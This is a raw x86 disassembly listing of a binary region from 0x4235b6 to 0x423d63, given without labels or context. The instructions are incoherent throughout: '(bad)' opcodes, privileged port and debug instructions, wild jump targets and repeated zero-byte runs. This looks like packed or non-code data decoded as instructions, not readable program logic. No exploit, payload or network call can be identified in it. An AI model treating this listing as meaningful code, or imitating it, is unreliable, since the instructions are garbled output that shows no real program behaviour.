  4235b6:	add    BYTE PTR [ecx-0x69],0x35
  4235ba:	jno    0x423595
  4235bc:	push   edx
  4235bd:	add    BYTE PTR [edx],ah
  4235bf:	sub    al,0xe0
  4235c1:	je     0x423601
  4235c3:	push   edi
  4235c4:	xor    al,0x34
  4235c6:	stc    
  4235c7:	scas   al,BYTE PTR es:[edi]
  4235c8:	xchg   edx,eax
  4235c9:	sar    BYTE PTR ds:0x3097494,0xab
  4235d0:	call   0xede8:0xd781e940
  4235d7:	or     BYTE PTR [esi],0x0
  4235da:	inc    edx
  4235db:	aas    
  4235dc:	xchg   ebx,eax
  4235dd:	test   BYTE PTR [esi-0x42c8095e],0xae
  4235e4:	push   cs
  4235e5:	test   DWORD PTR [edi],ecx
  4235e7:	mov    dh,0x82
  4235e9:	rol    BYTE PTR [edx],0x9c
  4235ec:	idiv   BYTE PTR [edi*4-0x167bf152]
  4235f3:	mov    ebx,0x8a5be814
  4235f8:	push   cs
  4235f9:	add    BYTE PTR [ebx+0x76],cl
  4235fc:	dec    eax
  4235fd:	leave  
  4235fe:	sub    al,BYTE PTR [esi]
  423600:	je     0x8e26002f
  423606:	sub    al,0x5a
  423608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423609:	icebp  
  42360a:	jns    0x4235c2
  42360c:	push   cs
  42360d:	call   0xf498a2
  423612:	nop
  423613:	ficom  WORD PTR [esp+eiz*8-0x20]
  423617:	clc    
  423618:	add    al,0x80
  42361a:	add    BYTE PTR [eax],al
  42361c:	add    BYTE PTR [eax],al
  42361e:	add    BYTE PTR [edx+0x5085110b],ah
  423624:	add    BYTE PTR [edi],dl
  423626:	xchg   DWORD PTR [eax-0x21],esp
  423629:	pop    esp
  42362a:	in     al,0x38
  42362c:	push   eax
  42362d:	adc    DWORD PTR [eax],eax
  42362f:	nop
  423630:	fist   DWORD PTR [eax]
  423632:	out    0x4e,eax
  423634:	call   DWORD PTR [ebp+0xc4013ec]
  42363a:	push   edx
  42363b:	addr16 (bad) 
  42363d:	fild   WORD PTR [edi-0x6845bf7]
  423643:	dec    DWORD PTR [eax+0x6d]
  423646:	cmp    eax,0x553518
  42364b:	nop
  42364c:	fimul  WORD PTR [esi]
  42364e:	shl    BYTE PTR cs:[edi+edi*1+0x53],1
  423653:	fistp  QWORD PTR [esi]
  423655:	lods   eax,DWORD PTR ds:[esi]
  423656:	(bad)  
  423658:	dec    ebx
  423659:	xchg   esi,eax
  42365a:	push   ebp
  42365b:	mov    ah,0x32
  42365d:	jecxz  0x42365f
  42365f:	nop
  423660:	dec    ebx
  423661:	pushf  
  423662:	clc    
  423663:	test   al,0xb2
  423665:	mov    cl,0x0
  423667:	nop
  423668:	fidivr WORD PTR [edi]
  42366a:	in     al,0x3a
  42366c:	sbb    BYTE PTR [ebp+0x3fd9b8cb],bl
  423672:	sti    
  423673:	lahf   
  423674:	into   
  423675:	shl    BYTE PTR [edx+edi*2-0x22],cl
  423679:	dec    edi
  42367a:	in     al,0xe0
  42367c:	cmp    bh,bh
  42367e:	xchg   DWORD PTR [ebx+0x8d128b],esp
  423684:	add    BYTE PTR [eax],al
  423686:	add    BYTE PTR [eax],al
  423688:	in     eax,0x2f
  42368a:	jl     0x423687
  42368c:	or     esp,DWORD PTR [eax]
  42368e:	cli    
  42368f:	ins    BYTE PTR es:[edi],dx
  423690:	lds    esi,FWORD PTR [edx+0x720dfb74]
  423696:	ret    0xf6b7
  423699:	mov    bl,0xd1
  42369b:	add    eax,0x444b8a1e
  4236a0:	nop
  4236a1:	sub    eax,0x84f5ec25
  4236a6:	test   DWORD PTR [ebx],0x90f47214
  4236ac:	push   eax
  4236ad:	loope  0x42364c
  4236af:	int3   
  4236b0:	out    dx,eax
  4236b1:	dec    ecx
  4236b2:	clc    
  4236b3:	cld    
  4236b4:	sub    eax,DWORD PTR [ecx+0x56]
  4236b7:	pushf  
  4236b8:	mov    bh,0xf6
  4236ba:	test   esi,0x3ca57267
  4236c0:	push   ecx
  4236c1:	stos   BYTE PTR es:[edi],al
  4236c2:	ins    DWORD PTR es:[edi],dx
  4236c3:	push   ss
  4236c4:	(bad)  
  4236c6:	repz mov fs,edx
  4236c9:	xor    al,0xa1
  4236cb:	add    edi,DWORD PTR [ecx+esi*4-0x49]
  4236cf:	xchg   BYTE PTR [esi],ch
  4236d1:	mov    dh,0x30
  4236d3:	inc    ebp
  4236d4:	cwde   
  4236d5:	(bad)  
  4236d6:	leave  
  4236d7:	pop    ecx
  4236d8:	jmp    0xdc3be76f
  4236dd:	sub    al,0xb
  4236df:	and    BYTE PTR [eax+0x6a81e32b],bl
  4236e5:	je     0x4236da
  4236e7:	add    esp,DWORD PTR [edx+0x2d]
  4236ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236eb:	push   edx
  4236ec:	add    BYTE PTR [eax],al
  4236ee:	add    BYTE PTR [eax],al
  4236f0:	add    BYTE PTR [eax],dl
  4236f2:	ror    bl,0x3
  4236f5:	pop    ss
  4236f6:	mov    esi,0xad1c07db
  4236fb:	pusha  
  4236fc:	inc    ecx
  4236fd:	xchg   esp,eax
  4236fe:	sub    eax,0xfa5cfaed
  423703:	fwait
  423704:	push   ebp
  423705:	pushf  
  423706:	sub    edi,DWORD PTR ds:0x4f970700
  42370c:	add    edx,DWORD PTR [edi]
  42370e:	icebp  
  42370f:	push   cs
  423710:	loope  0x42371a
  423712:	hlt    
  423713:	lss    edx,FWORD PTR [esi+eax*8+0x2e]
  423718:	ins    BYTE PTR es:[edi],dx
  423719:	push   esp
  42371a:	mov    DWORD PTR [edx],0x9bb6d172
  423720:	in     eax,dx
  423721:	or     eax,eax
  423723:	into   
  423724:	dec    ebp
  423725:	push   ss
  423726:	jnp    0x423736
  423728:	mov    esp,0xe5f6bf91
  42372d:	int3   
  42372e:	(bad)
  423731:	push   es
  423732:	ins    DWORD PTR es:[edi],dx
  423733:	div    BYTE PTR [esi+0x5e]
  423736:	cmp    eax,0xc9c6ed
  42373b:	adc    ch,cl
  42373d:	and    DWORD PTR [esi-0x4da89422],esi
  423743:	sete   al
  423746:	in     al,0xac
  423748:	or     DWORD PTR ds:0xfa970ef7,0x53dbdea5
  423752:	mov    dl,0xae
  423754:	stc    
  423755:	add    BYTE PTR [eax],al
  423757:	add    BYTE PTR [eax],al
  423759:	add    BYTE PTR [edi+esi*8],dl
  42375c:	push   cs
  42375d:	xchg   ecx,eax
  42375e:	xchg   ebx,eax
  42375f:	lds    ecx,FWORD PTR ds:0x791e7f6a
  423765:	sub    eax,0xe81ab28c
  42376a:	shl    DWORD PTR [ebp-0x4dafaf9c],1
  423770:	push   cs
  423771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423772:	mov    edi,0x8c2d9043
  423777:	or     ebp,DWORD PTR [edx-0x21df6bd7]
  42377d:	imul   edx,DWORD PTR [eax-0x4e],0x44
  423781:	sahf   
  423782:	(bad)
  423786:	mov    esp,ds
  423788:	shl    DWORD PTR [ebx*1+0x1d00914e],1
  42378f:	sahf   
  423790:	fwait
  423791:	push   ebp
  423792:	or     eax,0x5d6a41e4
  423797:	fistp  WORD PTR cs:[ecx+0x11]
  42379b:	cli    
  42379c:	mov    dl,0x0
  42379e:	jns    0x4237ce
  4237a0:	sub    esp,DWORD PTR [eax-0x72f10ca5]
  4237a6:	and    al,0x57
  4237a8:	notrack jmp DWORD PTR [edi-0x69]
  4237ac:	jmp    0x1f36f888
  4237b1:	test   DWORD PTR [ecx-0x31],ebp
  4237b4:	adc    DWORD PTR [edx],esi
  4237b6:	imul   ecx,DWORD PTR [ebx-0xd],0x74b33900
  4237bd:	sbb    eax,0x0
  4237c2:	add    BYTE PTR [edi+ebp*8+0x228159e2],bl
  4237c9:	mov    bl,0x0
  4237cb:	sub    DWORD PTR [eax],edi
  4237cd:	push   ebx
  4237ce:	hlt    
  4237cf:	dec    ecx
  4237d0:	cmp    ah,BYTE PTR [eax+0x2c]
  4237d3:	mov    fs,WORD PTR [ecx-0x69]
  4237d6:	inc    esi
  4237d7:	inc    ebp
  4237d8:	ror    dh,0x74
  4237db:	lahf   
  4237dc:	ror    BYTE PTR [eax],1
  4237de:	lea    eax,[edi+ecx*2]
  4237e1:	inc    edi
  4237e2:	call   0x505757
  4237e7:	ins    BYTE PTR es:[edi],dx
  4237e8:	and    dl,0x50
  4237eb:	mov    esi,0x6ff3ac0
  4237f0:	sub    al,0x50
  4237f2:	push   eax
  4237f3:	xor    al,0x73
  4237f5:	(bad)  
  4237f7:	arpl   WORD PTR [ecx-0x240aaa65],bx
  4237fd:	neg    BYTE PTR [esi+0x14]
  423800:	mov    bl,0xe
  423802:	lea    esi,[edx+eax*2+0x3e]
  423806:	inc    DWORD PTR [edi-0x6f281676]
  42380c:	ror    BYTE PTR [edi+0x38],cl
  42380f:	adc    eax,0xfaa87d0c
  423814:	imul   edx,DWORD PTR [ebp+edx*2+0x3ffa9384],0x2d
  42381c:	dec    esp
  42381d:	adc    DWORD PTR [ebp-0x4be382b],ecx
  423823:	fisub  WORD PTR [edi+0xd3e7]
  423829:	add    BYTE PTR [eax],al
  42382b:	add    BYTE PTR [ecx],cl
  42382d:	push   ss
  42382e:	and    eax,0x94605085
  423833:	data16 jno 0x423814
  423836:	pop    esp
  423837:	call   0xa57c1c25
  42383c:	nop
  42383d:	dec    ebx
  42383e:	xchg   esp,eax
  42383f:	inc    ebp
  423840:	sub    BYTE PTR [esi+eiz*8],bl
  423843:	jb     0x4238c1
  423845:	mov    WORD PTR [esi+0x6c0bce89],?
  42384b:	ror    BYTE PTR [edi+0x17fb77d7],0xa5
  423852:	jnp    0x423872
  423854:	sbb    eax,0xf859e107
  423859:	inc    edx
  42385a:	mov    WORD PTR [eax],es
  42385c:	nop
  42385d:	into   
  42385e:	sub    al,0xf0
  423860:	pusha  
  423861:	inc    esp
  423862:	pop    esi
  423863:	sub    al,0xef
  423865:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423866:	cwde   
  423867:	inc    edx
  423868:	dec    esp
  423869:	into   
  42386a:	ror    BYTE PTR [ebx],cl
  42386c:	adc    al,0x8d
  42386e:	in     eax,0xfb
  423870:	xlat   BYTE PTR ds:[ebx]
  423871:	icebp  
  423872:	xor    DWORD PTR [ebp-0x17b4a49b],ecx
  423878:	mov    edx,0xd00122f
  42387d:	xchg   edi,eax
  42387e:	loop   0x4238d0
  423880:	mov    bh,0x7d
  423882:	ss sti 
  423884:	(bad)  
  423885:	shr    BYTE PTR [eax+ecx*2],cl
  423888:	or     eax,0x1407b7b3
  42388d:	or     DWORD PTR [edi+esi*8+0x0],0x0
  423895:	fwait
  423896:	enter  0x88db,0xe5
  42389a:	dec    edx
  42389b:	push   ds
  42389c:	in     al,dx
  42389d:	dec    edi
  42389e:	push   ss
  42389f:	test   DWORD PTR [ebx],0x547ff70d
  4238a5:	jnp    0x42386b
  4238a7:	shl    esi,cl
  4238a9:	inc    ebx
  4238aa:	aaa    
  4238ab:	mov    bh,0x8d
  4238ad:	shr    dh,cl
  4238af:	in     al,0x90
  4238b1:	push   eax
  4238b2:	(bad)  [ebp+0x70e717cc]
  4238b8:	call   0xa51d878c
  4238bd:	and    al,0xc9
  4238bf:	mov    ebx,0x73d7bf03
  4238c4:	add    al,0x5
  4238c6:	out    dx,eax
  4238c7:	jnp    0x42391e
  4238c9:	sub    eax,edi
  4238cb:	out    dx,eax
  4238cc:	test   al,0xee
  4238cf:	into   
  4238d0:	pop    esp
  4238d1:	adc    eax,0x57fd8272
  4238d6:	jnp    0x423892
  4238d8:	xchg   DWORD PTR [eax+esi*4+0x6fd9c3c8],eax
  4238df:	sti    
  4238e0:	add    ecx,DWORD PTR [edi-0x1c]
  4238e3:	(bad)  
  4238e4:	faddp  st(1),st
  4238e6:	mov    dl,0xf7
  4238e8:	mul    BYTE PTR [esi+edx*4-0x35]
  4238ec:	mov    dl,BYTE PTR [ebp-0x6fbfbfe2]
  4238f2:	sub    bh,cl
  4238f4:	test   BYTE PTR [ecx-0x7e],0x1e
  4238f8:	mov    eax,DWORD PTR [eax]
  4238fa:	add    BYTE PTR [eax],al
  4238fc:	add    BYTE PTR [eax],al
  4238fe:	shl    BYTE PTR ds:0xe3956fa0,0xd
  423905:	push   ebp
  423906:	test   al,0x6
  423908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423909:	add    edx,DWORD PTR [eax+0x62230e4a]
  42390f:	mov    dl,0xe
  423911:	(bad)  
  423912:	in     eax,0xd7
  423914:	dec    ecx
  423915:	stos   BYTE PTR es:[edi],al
  423916:	stos   DWORD PTR es:[edi],eax
  423917:	add    ebx,DWORD PTR [edi]
  423919:	jmp    0x1e106fb1
  42391e:	sahf   
  42391f:	aaa    
  423920:	(bad)  
  423921:	lds    eax,FWORD PTR [edi-0x159ae4cb]
  423927:	test   BYTE PTR [esi],0x13
  42392a:	xchg   ebx,eax
  42392b:	dec    edx
  42392c:	jo     0x42399f
  42392e:	xchg   ebx,eax
  42392f:	mov    dl,0xf6
  423931:	(bad)  
  423932:	mov    eax,ds:0x7880eb2
  423937:	aam    0x52
  423939:	jmp    0x6a650c9c
  42393e:	aaa    
  42393f:	lahf   
  423940:	inc    ecx
  423941:	(bad)  
  423942:	fist   WORD PTR [esi-0x3bed60de]
  423948:	add    ch,cl
  42394a:	or     al,bh
  42394c:	xor    al,BYTE PTR ds:0x4d2b33df
  423952:	mov    edx,0x6da70ef6
  423957:	inc    eax
  423958:	push   esp
  423959:	stc    
  42395a:	pop    ss
  42395b:	(bad)  
  42395c:	push   ds
  42395d:	mov    esp,0xe02cc06
  423962:	add    BYTE PTR [eax],al
  423964:	add    BYTE PTR [eax],al
  423966:	add    BYTE PTR [esi-0xe],dl
  423969:	cdq    
  42396a:	adc    DWORD PTR [ebp+esi*1-0x5],ebx
  42396e:	jne    0x42391c
  423970:	aam    0x33
  423972:	fs pop edi
  423974:	xchg   esi,eax
  423975:	push   es
  423976:	nop
  423977:	sti    
  423978:	inc    ebx
  423979:	mov    cl,0xe9
  42397b:	xchg   ebx,eax
  42397c:	aam    0xed
  42397e:	ins    BYTE PTR es:[edi],dx
  42397f:	inc    eax
  423980:	xchg   esi,eax
  423981:	push   es
  423982:	(bad)  
  423983:	xlat   BYTE PTR ds:[ebx]
  423984:	dec    edx
  423985:	or     DWORD PTR [edx],edi
  423987:	mov    ebp,0xe9009337
  42398c:	retf   
  42398d:	adc    al,BYTE PTR [ebx+0x5d12a667]
  423993:	xor    dh,dl
  423995:	xor    bh,BYTE PTR [eax]
  423997:	xor    ch,dl
  423999:	xor    ch,BYTE PTR [eax+eiz*1]
  42399c:	repnz xor ah,BYTE PTR [eax]
  42399f:	and    al,0xf2
  4239a1:	xor    bl,BYTE PTR [ecx+ecx*8]
  4239a4:	xor    edx,DWORD PTR [edx+0x24]
  4239a7:	mov    cl,0xe6
  4239a9:	jmp    0xd2298722
  4239ae:	inc    esp
  4239af:	dec    ebp
  4239b0:	xchg   DWORD PTR [esi],ebx
  4239b2:	mov    WORD PTR [ecx+0x4d5c97b6],?
  4239b8:	jg     0x4239b0
  4239ba:	ret    0xafb7
  4239bd:	push   cs
  4239be:	add    ecx,0xffffffb6
  4239c1:	bound  ebp,QWORD PTR [esi]
  4239c3:	icebp  
  4239c4:	retf   0x4832
  4239c7:	icebp  
  4239c8:	retf   0x481a
  4239cb:	add    BYTE PTR [eax],al
  4239cd:	add    BYTE PTR [eax],al
  4239cf:	add    ah,bh
  4239d1:	xchg   esi,eax
  4239d2:	je     0x4239dc
  4239d4:	popa   
  4239d5:	pop    ds
  4239d6:	idiv   bh
  4239d8:	dec    cx
  4239da:	adc    al,0x68
  4239dc:	out    dx,eax
  4239dd:	popf   
  4239de:	push   cs
  4239df:	add    BYTE PTR [ecx],al
  4239e1:	push   cs
  4239e2:	idiv   bh
  4239e4:	jbe    0x423a2b
  4239e6:	inc    ecx
  4239e7:	inc    esp
  4239e8:	inc    eax
  4239e9:	fsubr  DWORD PTR [ebp-0x38]
  4239ec:	xchg   esi,eax
  4239ed:	dec    ecx
  4239ee:	adc    eax,0x229b2d8b
  4239f3:	or     DWORD PTR [edi],ebp
  4239f5:	lahf   
  4239f6:	xchg   ebp,eax
  4239f7:	inc    esp
  4239f8:	fnstsw WORD PTR [edx+0x49]
  4239fb:	pop    esi
  4239fc:	add    dh,BYTE PTR [edx]
  4239fe:	rcr    BYTE PTR [ebx+ebp*1],cl
  423a01:	mov    ds:0x5362550e,eax
  423a06:	inc    eax
  423a07:	mov    edx,DWORD PTR [eax-0x417ae522]
  423a0d:	in     al,0x5e
  423a0f:	call   0x5372e1
  423a14:	or     al,0x9
  423a16:	jge    0x423a7f
  423a18:	inc    edi
  423a19:	fwait
  423a1a:	cli    
  423a1b:	test   eax,0x84e20ba6
  423a20:	rcr    BYTE PTR [eax+edx*2+0x76bd8587],1
  423a27:	inc    esp
  423a28:	nop
  423a29:	mov    ch,0x12
  423a2b:	xchg   ax,ax
  423a2d:	cmp    DWORD PTR [eax-0x1],0xfb2877
  423a34:	add    BYTE PTR [eax],al
  423a36:	add    BYTE PTR [eax],al
  423a38:	add    BYTE PTR [eax+0x6f85e9c4],dl
  423a3e:	cmp    BYTE PTR [edi],dh
  423a40:	sti    
  423a41:	fstp   QWORD PTR [ebx-0x6a]
  423a44:	or     eax,0x2d64fc
  423a49:	push   edi
  423a4a:	pop    edi
  423a4b:	adc    eax,0x10cc178d
  423a50:	add    BYTE PTR [eax+0x7871e201],dl
  423a56:	gs rcpps xmm4,xmm0
  423a5a:	jecxz  0x423a4e
  423a5c:	cli    
  423a5d:	das    
  423a5e:	adc    DWORD PTR [esi-0x683e435],0xe2912560
  423a68:	out    0x7c,eax
  423a6a:	cwde   
  423a6b:	jl     0x423a7d
  423a6d:	xor    eax,eax
  423a6f:	jbe    0x423ab5
  423a71:	nop
  423a72:	test   al,0x7c
  423a74:	or     al,0x66
  423a76:	mov    al,0x41
  423a78:	cmp    BYTE PTR [ebx],dl
  423a7a:	nop
  423a7b:	adc    eax,0xf8b3e087
  423a80:	xor    BYTE PTR [eax+0x3fc2964b],dl
  423a86:	mov    dl,0xc0
  423a88:	push   ss
  423a89:	fstp   TBYTE PTR [edi-0x31d35b19]
  423a8f:	cmp    eax,DWORD PTR [ebx+ecx*8]
  423a92:	mov    edi,0xe2bb59cb
  423a97:	ja     0x514fe169
  423a9d:	add    BYTE PTR [eax],al
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    bh,ch
  423aa3:	fbstp  TBYTE PTR [eax-0x20]
  423aa6:	inc    edx
  423aa7:	sub    eax,0x4114fc22
  423aac:	or     edi,DWORD PTR [eax-0x58]
  423aaf:	jnp    0x423a78
  423ab1:	add    edx,DWORD PTR [eax-0x108748d2]
  423ab7:	loope  0x423ade
  423ab9:	fsub   QWORD PTR [ebp+0xcf39438]
  423abf:	jb     0x423aa4
  423ac1:	inc    ebp
  423ac2:	pop    ss
  423ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ac4:	inc    ebx
  423ac5:	pop    edi
  423ac6:	int3   
  423ac7:	mov    dl,0x11
  423ac9:	add    al,0xf6
  423acb:	mov    dl,0xad
  423acd:	pop    ebp
  423ace:	push   edi
  423acf:	push   ecx
  423ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423ad1:	stc    
  423ad2:	nop
  423ad3:	mov    dl,0x70
  423ad5:	in     al,dx
  423ad6:	or     eax,0x3b1dc339
  423adb:	mov    edi,0x16857ec7
  423ae0:	rol    BYTE PTR [edi-0x70],0x39
  423ae4:	stos   BYTE PTR es:[edi],al
  423ae5:	call   DWORD PTR [ecx+esi*1]
  423ae8:	pop    es
  423ae9:	add    al,0x90
  423aeb:	mov    dl,0xad
  423aed:	repnz mov eax,ds:0x63048176
  423af3:	loop   0x423b04
  423af5:	dec    edi
  423af6:	or     bh,BYTE PTR [ecx]
  423af8:	sbb    al,0x7f
  423afa:	retf   
  423afb:	sub    al,0xe7
  423afd:	fcmovnb st,st(4)
  423aff:	cmp    eax,0x9df7f2ec
  423b04:	push   cs
  423b05:	test   BYTE PTR [eax],0x0
  423b08:	add    BYTE PTR [eax],al
  423b0a:	add    BYTE PTR [eax-0x5e],ch
  423b0d:	scas   eax,DWORD PTR es:[edi]
  423b0e:	dec    ebp
  423b0f:	aas    
  423b10:	out    dx,al
  423b11:	push   cs
  423b12:	out    0x58,al
  423b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b15:	inc    esp
  423b16:	fisub  WORD PTR [ebx+0x76]
  423b19:	xchg   ecx,eax
  423b1a:	lods   eax,DWORD PTR ds:[esi]
  423b1b:	(bad)  
  423b1c:	das    
  423b1d:	faddp  st(1),st
  423b1f:	pop    eax
  423b20:	or     BYTE PTR [esi],0xe9
  423b23:	ss je  0x423b73
  423b26:	rol    BYTE PTR [ebp-0x13269cc3],cl
  423b2c:	adc    eax,0x3d942579
  423b31:	arpl   bp,si
  423b33:	cmp    DWORD PTR ds:0x6f16dd3e,edi
  423b39:	sbb    dh,BYTE PTR [edi]
  423b3b:	loope  0x423b34
  423b3d:	ds cmp bh,bh
  423b40:	(bad)  
  423b41:	xor    bl,cl
  423b43:	fldcw  WORD PTR [edi]
  423b45:	and    ebx,DWORD PTR [ebp-0x32]
  423b48:	out    dx,al
  423b49:	push   cs
  423b4a:	push   ds
  423b4b:	out    0xb6,eax
  423b4d:	xor    dl,ch
  423b4f:	fdivr  QWORD PTR [esi+0x3c08f532]
  423b55:	sbb    eax,0xeb32165
  423b5a:	jmp    0x5f5f9b77
  423b5f:	sbb    DWORD PTR [ebx+0x315be90e],esi
  423b65:	cmp    eax,0xce2e93e9
  423b6a:	out    0xf,al
  423b6c:	mov    eax,0xe90e
  423b71:	add    BYTE PTR [eax],al
  423b73:	add    BYTE PTR [ebx+0x7faf9bdd],dl
  423b79:	loop   0x423b0c
  423b7b:	sub    al,0x2
  423b7d:	sub    dl,BYTE PTR [edx-0x33]
  423b80:	xchg   edi,eax
  423b81:	cmp    eax,DWORD PTR [ebx]
  423b83:	sbb    DWORD PTR [ebp+0x3a000ef2],esp
  423b89:	cmp    dl,BYTE PTR [ebx-0x1f0c9025]
  423b8f:	inc    esp
  423b90:	out    0xb0,al
  423b92:	pcmpeqb mm2,mm1
  423b95:	mov    eax,0xd5d9245a
  423b9a:	push   cs
  423b9b:	jmp    DWORD PTR [ebp-0x4ab664c7]
  423ba1:	aad    0xed
  423ba3:	out    0x85,eax
  423ba5:	xchg   esp,eax
  423ba6:	verr   WORD PTR [esi+ebp*2]
  423baa:	bound  edx,QWORD PTR [ecx]
  423bac:	inc    ebx
  423bad:	scas   al,BYTE PTR es:[edi]
  423bae:	fwait
  423baf:	mov    BYTE PTR [ecx],bh
  423bb1:	mov    bl,0xe
  423bb3:	add    cl,dl
  423bb5:	and    al,0x2a
  423bb7:	add    DWORD PTR [ecx+0x767fce30],ebp
  423bbd:	jmp    0x72e02ee7
  423bc2:	cmc    
  423bc3:	or     bl,BYTE PTR [edx+0x73]
  423bc6:	dec    esi
  423bc7:	data16 add bl,ch
  423bca:	loope  0x423bd2
  423bcc:	loop   0x423c22
  423bce:	jmp    0xe9ed9147
  423bd3:	adc    eax,0x4ea011
  423bd8:	add    BYTE PTR [eax],al
  423bda:	add    BYTE PTR [eax],al
  423bdc:	add    ah,ah
  423bde:	push   edi
  423bdf:	addr16 adc ebp,esi
  423be2:	mov    edx,0x22182032
  423be7:	jne    0x423c2d
  423be9:	sub    esi,ebx
  423beb:	inc    ecx
  423bec:	call   FWORD PTR [ecx]
  423bee:	jecxz  0x423c5d
  423bf0:	les    edi,FWORD PTR ds:0xb3e8f6b6
  423bf6:	xchg   ecx,eax
  423bf7:	push   cs
  423bf8:	add    BYTE PTR [edx+0x1beb4b6f],dh
  423bfe:	mov    dh,0x23
  423c00:	pushf  
  423c01:	and    ch,bh
  423c03:	push   cs
  423c04:	call   DWORD PTR [eax+0x631c3515]
  423c0a:	add    dh,bl
  423c0c:	push   edx
  423c0d:	pusha  
  423c0e:	int3   
  423c0f:	(bad)  
  423c10:	or     al,0x4f
  423c12:	pop    ss
  423c13:	pop    edx
  423c14:	pop    ecx
  423c15:	ror    BYTE PTR [ecx+edx*1-0x5],cl
  423c19:	fs ins DWORD PTR es:[edi],dx
  423c1b:	in     eax,dx
  423c1c:	cli    
  423c1d:	pop    esp
  423c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c1f:	push   cs
  423c20:	sti    
  423c21:	inc    esp
  423c22:	lods   eax,DWORD PTR ds:[esi]
  423c23:	push   cs
  423c24:	call   0xfc209c99
  423c29:	sar    DWORD PTR [ebp+0x6b],cl
  423c2c:	in     al,dx
  423c2d:	adc    ebx,DWORD PTR [ebp+0x5]
  423c30:	push   edx
  423c31:	inc    edi
  423c32:	(bad)  
  423c33:	sti    
  423c34:	xchg   DWORD PTR [ecx-0x6008d690],esp
  423c3a:	pop    es
  423c3b:	xchg   ecx,eax
  423c3c:	cmp    eax,0x56a21e
  423c41:	add    BYTE PTR [eax],al
  423c43:	add    BYTE PTR [eax],al
  423c45:	add    BYTE PTR [eax-0x6ef96bbc],dl
  423c4b:	dec    ebx
  423c4c:	adc    DWORD PTR [ebp+0x6638a086],eax
  423c52:	fwait
  423c53:	mov    esi,0x23c9ec44
  423c58:	ins    DWORD PTR es:[edi],dx
  423c59:	mov    eax,ds:0xfb4b4b90
  423c5e:	mov    ah,0x4
  423c61:	les    eax,FWORD PTR [ebx-0x1a72eef5]
  423c67:	out    0x6a,eax
  423c69:	enter  0xea38,0x4e
  423c6d:	sti    
  423c6e:	aas    
  423c6f:	iret   
  423c70:	ror    DWORD PTR [ebx],1
  423c72:	or     eax,0x900011ec
  423c77:	popa   
  423c78:	inc    ebp
  423c79:	xchg   ax,ax
  423c7b:	jl     0x423ca1
  423c7d:	sub    BYTE PTR [ebx],dl
  423c7f:	adc    BYTE PTR [ecx],dl
  423c81:	sti    
  423c82:	jge    0x423c36
  423c84:	scas   eax,DWORD PTR es:[edi]
  423c85:	adc    eax,0xf360b250
  423c8a:	or     eax,0x17158b3d
  423c8f:	gs movups xmm7,xmm4
  423c93:	mov    dl,0xf7
  423c95:	enter  0x7a92,0x7b
  423c99:	inc    ebx
  423c9a:	nop
  423c9b:	sub    esp,DWORD PTR [ebp+0x1f]
  423c9e:	div    DWORD PTR [eax+0x3d0df9a8]
  423ca4:	in     al,0x87
  423ca6:	cli    
  423ca7:	mov    dl,0xf7
  423ca9:	add    eax,DWORD PTR [eax]
  423cab:	add    BYTE PTR [eax],al
  423cad:	add    BYTE PTR [eax],al
  423caf:	pcmpgtw mm1,mm7
  423cb2:	vmptrld QWORD PTR ds:0xa5d088dc
  423cb9:	jnp    0x423c52
  423cbb:	nop
  423cbc:	mov    dl,0xf7
  423cbe:	fist   DWORD PTR [esi]
  423cc0:	mov    bh,dh
  423cc2:	add    edx,DWORD PTR [ebx+esi*2]
  423cc5:	int3   
  423cc6:	xchg   DWORD PTR [esi],ecx
  423cc8:	mov    bl,0xf7
  423cca:	add    ecx,DWORD PTR [edi]
  423ccc:	inc    edi
  423ccd:	sti    
  423cce:	sbb    dl,0x82
  423cd1:	inc    ecx
  423cd2:	jp     0x423c5e
  423cd4:	lock idiv DWORD PTR [ebp+edi*4+0x16]
  423cd9:	add    BYTE PTR [eax-0x70],cl
  423cdc:	dec    edx
  423cdd:	into   
  423cde:	lock nop
  423ce0:	mov    dl,0x7a
  423ce2:	(bad)  
  423ce3:	in     eax,0xce
  423ce5:	js     0x423cc7
  423ce7:	test   BYTE PTR [edi],ah
  423ce9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cea:	aaa    
  423ceb:	push   es
  423cec:	sti    
  423ced:	cld    
  423cee:	inc    ecx
  423cef:	nop
  423cf0:	dec    edx
  423cf1:	sbb    dh,cl
  423cf3:	nop
  423cf4:	mov    dl,0x72
  423cf6:	les    edi,FWORD PTR [ebp-0x631f871e]
  423cfc:	daa    
  423cfd:	mov    ebp,0xe18de2b
  423d02:	out    0xd1,al
  423d04:	mov    dl,0xf6
  423d06:	fsub   DWORD PTR [eax]
  423d08:	mov    dl,0xe
  423d0a:	ins    BYTE PTR es:[edi],dx
  423d0b:	aam    0xbe
  423d0d:	sub    ch,BYTE PTR [edx-0x10]
  423d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d11:	fwait
  423d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d13:	add    BYTE PTR [eax],al
  423d15:	add    BYTE PTR [eax],al
  423d17:	add    BYTE PTR [edi+0x51f93cfc],ch
  423d1d:	mov    dl,0xf6
  423d1f:	add    al,0xe0
  423d21:	mov    cl,0xe
  423d23:	fs int3 
  423d25:	mov    esi,0xa5f06a36
  423d2a:	fwait
  423d2b:	lahf   
  423d2c:	inc    ebx
  423d2d:	cld    
  423d2e:	jg     0x423d28
  423d30:	push   ecx
  423d31:	mov    dl,0xf6
  423d33:	shl    BYTE PTR [edi-0x2c93f14f],1
  423d39:	mov    esi,0x875dc102
  423d3e:	push   cs
  423d3f:	jmp    0xf2a4af5b
  423d44:	int    0xae
  423d46:	fs inc eax
  423d48:	dec    eax
  423d49:	mov    dl,0xf
  423d4b:	jns    0x423cd9
  423d4d:	dec    ebp
  423d4e:	add    al,0x6a
  423d50:	mov    eax,0x8c257916
  423d55:	mov    dl,0xf6
  423d57:	ret    
  423d58:	mov    al,0xb2
  423d5a:	push   cs
  423d5b:	bound  ecx,QWORD PTR [ebp+0x2d720fcc]
  423d61:	cmp    dh,bh
  423d63:	mov    edx,0xa04cd853
